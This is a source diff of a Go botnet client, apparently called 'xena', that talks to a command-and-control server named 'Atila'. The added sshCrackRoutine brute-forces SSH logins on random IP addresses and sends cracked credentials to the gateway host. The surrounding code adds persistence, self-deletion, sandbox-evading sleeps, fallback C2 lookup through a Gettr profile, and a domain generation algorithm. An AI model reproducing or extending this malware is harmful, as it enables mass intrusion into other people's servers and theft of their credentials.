@@ -1,11 +1,12 @@
 package main
 
 import (
-	"crypto/rsa"
 	"fmt"
 	"math/rand"
 	"net"
 	"time"
+	"xena/config"
+	"xena/gateway"
 	"xena/helpers"
 	"xena/modules"
 	"xena/repository"
@@ -14,23 +15,40 @@ import (
 	"github.com/google/uuid"
 )
 
-// Key-pair used for signing and verifying messages.
-var privateIdentificationKey *rsa.PrivateKey
-var publicIdentificationKey *rsa.PublicKey
-
-// Generate the unique bot identifier.
-var id string
-
 // Last time since the contact was made with bot herder.
 var lastContactMade int = helpers.TimeSinceJesus()
 
 // Does Atila (cnc) knows about us?
 var identified bool = false
 
+// sshCrackRoutine is an infinite loop of cracking SSH service.
+func sshCrackRoutine(gatewayHost string) {
+	for {
+		address := modules.IpRandomAddress()
+		user := modules.RandomSshUser()
+		pass := modules.RandomSshPass()
+		err := modules.SshCheck(address, user, pass, 22)
+		if err != nil {
+			fmt.Println(err)
+			continue
+		}
+		err = gateway.SubmitCreds(gatewayHost, gateway.Creds{
+			Ip:   address,
+			Port: 22,
+			User: user,
+			Pass: pass,
+		})
+		if err != nil {
+			fmt.Println(err)
+			continue
+		}
+	}
+}
+
 // tick is the content of the main loop. Returns false if something went wrong.
 func tick(host string) bool {
 	if !identified {
-		err := identify(host, id, publicIdentificationKey)
+		err := gateway.Identify(host, config.ID, config.PublicIdentificationKey)
 		if err != nil {
 			fmt.Println(err)
 			identified = false
@@ -40,26 +58,26 @@ func tick(host string) bool {
 		return true
 	}
 
-	messages, err := fetchMessages(host, id)
+	messages, err := gateway.FetchMessages(host, config.ID)
 	if err != nil {
 		fmt.Println(err)
 		return false
 	}
 
 	for _, message := range messages {
-		reply, err := interpretMessage(host, message)
+		reply, err := gateway.InterpretMessage(host, message)
 		if err != nil {
 			fmt.Println(err)
 			continue
 		}
 
-		err = sendMessage(host, reply)
+		err = gateway.SendMessage(host, reply)
 		if err != nil {
 			fmt.Println(err)
 			continue
 		}
 
-		err = messageAck(host, reply.ReplyTo)
+		err = gateway.MessageAck(host, reply.ReplyTo)
 		if err != nil {
 			fmt.Println(err)
 			continue
@@ -72,15 +90,17 @@ func tick(host string) bool {
 func initialize() {
 	// Check if the bot is persistent within the environment, if not then persist.
 	// But only if we're not set to remove the binary up on execution.
-	if !removeSelf {
+	if !config.RemoveSelf {
 		if !modules.CheckIfPersisted() {
 			err := modules.Persist()
 			fmt.Println(err)
+			return
 		}
 	} else {
 		err := modules.RemoveBinary()
 		if err != nil {
 			fmt.Println(err)
+			return
 		}
 	}
 
@@ -101,27 +121,27 @@ func initialize() {
 	// Check if we ever saved details about ourselves.
 	if len(botDetails.Id) == 0 && len(botDetails.PublicKey) == 0 && len(botDetails.PrivateKey) == 0 {
 		// Key-pair used for signing and verifying messages.
-		privateIdentificationKey = modules.GeneratePrivateKey()
-		publicIdentificationKey = &privateIdentificationKey.PublicKey
+		config.PrivateIdentificationKey = modules.GeneratePrivateKey()
+		config.PublicIdentificationKey = &config.PrivateIdentificationKey.PublicKey
 		// Generate the unique bot identifier.
-		id = uuid.New().String()
+		config.ID = uuid.New().String()
 
 		// Save into the database.
-		repository.InsertBotDetails(id, modules.PrivateKeyToPEM(privateIdentificationKey), modules.PublicKeyToPEM(publicIdentificationKey))
+		repository.InsertBotDetails(config.ID, modules.PrivateKeyToPEM(config.PrivateIdentificationKey), modules.PublicKeyToPEM(config.PublicIdentificationKey))
 	} else {
 		// Load into global variables bot's details.
-		privateIdentificationKey, err = modules.ImportPEMPrivateKey(botDetails.PrivateKey)
+		config.PrivateIdentificationKey, err = modules.ImportPEMPrivateKey(botDetails.PrivateKey)
 		if err != nil {
 			panic(err)
 		}
-		publicIdentificationKey = modules.ImportPEMPublicKey(botDetails.PublicKey)
-		id = botDetails.Id
+		config.PublicIdentificationKey = modules.ImportPEMPublicKey(botDetails.PublicKey)
+		config.ID = botDetails.Id
 	}
 
 	// Ignite the SSH cracker.
-	if enableSshCracker {
-		for i := 0; i < sshThreads; i++ {
-			go modules.SshCrackRoutine(gatewayHost)
+	if config.EnableSshCracker {
+		for i := 0; i < config.SshThreads; i++ {
+			go sshCrackRoutine(config.GatewayHost)
 		}
 	}
 }
@@ -130,9 +150,9 @@ func initialize() {
 func prepare() {
 	// Sleep for a certain amount of time. This way we'll avoid a lot of security solutions.
 	// This is insufficient if an environment performs acceleration of the system's sleep call.
-	if hybernate {
+	if config.Hybernate {
 		rand.Seed(time.Now().UnixNano())
-		time.Sleep(time.Minute * time.Duration(rand.Intn(hybernateMax-hybernateMin)+hybernateMax))
+		time.Sleep(time.Minute * time.Duration(rand.Intn(config.HybernateMax-config.HybernateMin)+config.HybernateMax))
 	}
 
 	// Calculate hash of itself, so that later we can delete the binary if needed.
@@ -152,18 +172,18 @@ func main() {
 	initialize()
 
 	// Bot's main loop which performs the tick operation. Consider the tick operation the actual content of the main loop.
-	for range time.Tick(time.Second * time.Duration(rand.Intn(maxLoopWait-minLoopWait)+maxLoopWait)) {
+	for range time.Tick(time.Second * time.Duration(rand.Intn(config.MaxLoopWait-config.MinLoopWait)+config.MaxLoopWait)) {
 		rand.Seed(time.Now().UnixNano())
 
 		// We need to reach out to hardcoded host of Atila. (cnc)
-		if tick(gatewayHost) {
+		if tick(config.GatewayHost) {
 			// Reset the timer of DGA and move on...
 			lastContactMade = helpers.TimeSinceJesus()
 			continue
 		}
 
 		// Reachout to Atila (cnc) host via 'website' property on a Gettr profile.
-		gettrGatewayHost, err := services.GettrProfileWebsite(gettrProfileName)
+		gettrGatewayHost, err := services.GettrProfileWebsite(config.GettrProfileName)
 		if err == nil && len(gettrGatewayHost) != 0 {
 			if tick(gettrGatewayHost) {
 				// Reset the timer of DGA and move on...
@@ -173,9 +193,9 @@ func main() {
 		}
 
 		// Check if DGA should kick it.
-		if helpers.TimeSinceJesus()-lastContactMade > dgaAfterDays {
+		if helpers.TimeSinceJesus()-lastContactMade > config.DgaAfterDays {
 			// Try to find the Atila (cnc) behind a generated domain.
-			for _, host := range helpers.Dga(dgaSeed) {
+			for _, host := range helpers.Dga(config.DgaSeed) {
 				if _, err := net.LookupIP(host); err != nil {
 					continue
 				}
